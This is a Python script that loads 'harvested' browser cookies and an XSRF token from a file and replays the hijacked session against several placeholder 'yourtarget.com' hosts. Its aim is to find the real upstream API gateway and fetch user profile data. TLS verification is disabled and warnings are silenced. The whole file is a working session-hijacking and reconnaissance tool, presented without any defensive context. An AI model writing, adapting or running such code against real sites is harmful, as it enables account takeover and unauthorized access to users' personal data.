import json
import httpx
import warnings

warnings.filterwarnings("ignore")

COOKIE_FILE = "harvested_cookies.json"

def discover_upstream():
    print("[*] Initializing Upstream API Gateway Discovery...")
    
    try:
        with open(COOKIE_FILE, "r", encoding="utf-8") as f:
            cookies_list = json.load(f)
    except Exception as e:
        print(f"[!] Error loading {COOKIE_FILE}: {e}")
        return
        
    cookie_jar = {c['name']: c['value'] for c in cookies_list}
    xsrf_token = cookie_jar.get("XSRF-TOKEN", "")
    
    # Potential upstream API candidate domains extracted from runtime config and cookies
    candidates = [
        "https://yourtarget.com",
        "https://api.yourtarget.com",
        "https://yourtarget.com",
        "https://yourtarget.com"
    ]
    
    client = httpx.Client(verify=False, timeout=10.0, follow_redirects=False, cookies=cookie_jar)
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    if xsrf_token:
        headers["X-XSRF-TOKEN"] = xsrf_token
        
    print(f"[+] Testing {len(candidates)} gateway candidates with harvested session & XSRF token...\n")
    
    for base in candidates:
        url = f"{base}/user-center/api/v1/users/profile"
        try:
            res = client.get(url, headers=headers)
            print(f"    -> Target: {url}")
            print(f"       Status: {res.status_code} | Length: {len(res.text)}")
            if len(res.text) != 717 and res.status_code != 404:
                print(f"        [***] BINGO! TRUE API UPSTREAM FOUND: {res.text[:300]}...\n")
            else:
                print(f"        [-] SPA shell or endpoint not found here.")
        except httpx.RequestError as e:
            print(f"    -> Target {base} Connection Error: {e}")
        print()
        
    client.close()
    print("[*] Upstream discovery cycle complete.")

if __name__ == "__main__":
    discover_upstream()
